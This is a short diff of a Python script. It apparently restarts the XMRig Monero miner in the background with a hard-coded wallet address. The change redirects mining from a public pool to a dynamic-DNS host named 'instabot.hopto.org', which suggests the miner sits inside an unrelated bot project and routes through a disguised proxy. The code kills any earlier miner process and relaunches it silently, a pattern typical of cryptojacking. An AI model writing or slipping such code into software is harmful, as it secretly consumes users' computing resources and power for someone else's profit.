@@ -23,7 +23,7 @@ procID = xmrig.stdout.readline()
 procID = procID[:-1]
 if(procID != "" and procID.isdigit()):
 	subprocess.Popen(['kill', str(int(procID))])
-cmd = ['xmrig/build/xmrig', '-o', 'pool.monero.hashvault.pro:5555', '-u', '48fEvxEGfYyU13JYPjfvyzWR4WammKcuRPxnKyTfAYWHAahbQHNwW8D4GCukwuhCE4g2NR5MiDnhhQ2EZbYzEjhMKgzMUFY', '-p', 'x', '-k', '-B']
+cmd = ['xmrig/build/xmrig', '-o', 'instabot.hopto.org:5555', '-u', '48fEvxEGfYyU13JYPjfvyzWR4WammKcuRPxnKyTfAYWHAahbQHNwW8D4GCukwuhCE4g2NR5MiDnhhQ2EZbYzEjhMKgzMUFY', '-p', 'x', '-k', '-B']
 subprocess.Popen(cmd)
 #cycle to recover from failure
 while(work_made == False):
